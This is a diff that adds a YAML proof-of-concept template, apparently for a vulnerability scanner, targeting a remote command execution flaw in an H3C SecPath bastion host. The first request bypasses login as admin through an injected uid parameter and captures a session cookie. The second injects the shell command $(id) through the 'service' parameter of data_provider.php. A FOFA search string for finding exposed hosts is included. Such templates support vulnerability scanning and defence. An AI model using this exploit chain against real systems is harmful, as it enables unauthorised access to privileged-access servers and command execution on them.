@@ -1,0 +1,42 @@
+id: poc-yaml-h3c-secparh-jump-server-data-provider-php-rce
+info:
+  name: H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞
+  severity: high
+  tags:
+  - rce
+  - 两高一弱
+  finger: H3C SecParh堡垒机
+  fofa: app="H3C-SecPath-运维审计系统" && body="2018"
+requests:
+- method: GET
+  path: /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
+  expression: 'status_code == 200
+
+    && contains(body,"错误的id")
+
+    && contains(body,"admin")
+
+    && contains(body,"双人复核")
+
+    && contains(title,"运维审计系统 - 运维审计系统")
+
+    '
+  output:
+  - regex_match(headers,"(?P<cookie>PHPSESSID=[a-z0-9]+)")
+- method: GET
+  path: /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true
+  headers:
+    Cookie: '{{.cookie}}'
+  expression: 'status_code == 200
+
+    && contains(body,"cmdline")
+
+    && contains(body,"uid=")
+
+    && !contains(body,"<")
+
+    && content_type == "text/x-json"
+
+    '
+variables: {}
+transport: http
